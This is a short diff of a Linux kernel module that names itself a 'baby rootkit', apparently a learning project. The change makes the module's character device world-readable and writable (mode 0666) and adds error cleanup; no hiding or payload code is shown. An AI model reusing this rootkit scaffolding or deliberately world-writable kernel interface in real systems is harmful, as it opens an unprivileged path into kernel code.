@@ -38,10 +38,23 @@ static int __init pwh_init(void){
         erro_code = PTR_ERR(module_class);
         goto err_device;
     }
-    printk(KERN_INFO "[peiwithhao rootkit] Register a ch-device successfully...");
+    printk(KERN_INFO "[peiwithhao rootkit] Register a ch-device successfully!");
+
+    /* 赋予读写权限 */
+    __file = filp_open(DEVICE_PATH, O_RDONLY, 0);
+    if(IS_ERR(__file)){
+        printk(KERN_INFO "[peiwithhao rootkit] Open the chrdev failed....");
+        erro_code = PTR_ERR(__file);
+        goto err_file;
+    }
+    __inode = file_inode(__file);
+    __inode->i_mode |= 0666;
+    filp_close(__file, NULL);
     return 0;
 
     /* 处理错误 */
+err_file:
+    device_destroy(module_class, MKDEV(major_num, 0));
 err_device:
     class_destroy(module_class);
 err_class:
@@ -51,7 +64,7 @@ err_major:
 }
 
 static void __exit pwh_exit(void){
-    printk(KERN_INFO "Peiwithhao's baby rootkit out :(\n");
+    printk(KERN_INFO "[peiwithhao rootkit] Peiwithhao's baby rootkit out :(\n");
     device_destroy(module_class, MKDEV(major_num, 0));
     class_destroy(module_class);
     unregister_chrdev(0, DEVICE_NAME);
